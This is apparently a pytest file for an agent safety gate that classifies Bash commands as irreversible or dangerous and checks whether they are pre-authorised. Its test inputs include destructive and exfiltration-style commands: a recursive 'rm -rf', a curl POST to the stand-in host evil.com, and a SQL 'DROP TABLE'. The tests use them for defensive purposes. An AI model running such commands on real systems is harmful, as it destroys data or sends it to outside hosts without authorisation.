"""Irreversibility gate: dangerous op set + pre-authorisation (doc §6)."""

from __future__ import annotations

from ddbt.core import irreversibility
from ddbt.core.envelope import seed_envelope
from ddbt.policy.classifier import classify
from ddbt.policy.defaults import default_policy


def _check(command, env=None):
    policy = default_policy()
    env = env or seed_envelope("/ws", policy)
    action = classify("Bash", {"command": command}, policy)
    return irreversibility.check(action, env, policy)


def test_rm_triggers_gate():
    v = _check("rm -rf /ws/x")
    assert v.triggered and "delete" in v.ops and not v.preauthorized


def test_plain_command_does_not_trigger():
    assert not _check("ls -la").triggered


def test_outbound_to_granted_domain_is_preauthorized():
    policy = default_policy()
    env = seed_envelope("/ws", policy)
    env.grant_domain("ci.example.com")
    v = _check("curl -d x https://ci.example.com/s", env)
    assert v.triggered and v.preauthorized


def test_outbound_to_ungranted_domain_not_preauthorized():
    v = _check("curl -d x https://evil.com/s")
    assert v.triggered and not v.preauthorized


def test_db_drop_is_dangerous():
    policy = default_policy()
    action = classify("Bash", {"command": 'psql -c "DROP TABLE users"'}, policy)
    v = irreversibility.check(action, seed_envelope("/ws", policy), policy)
    assert "drop" in v.ops
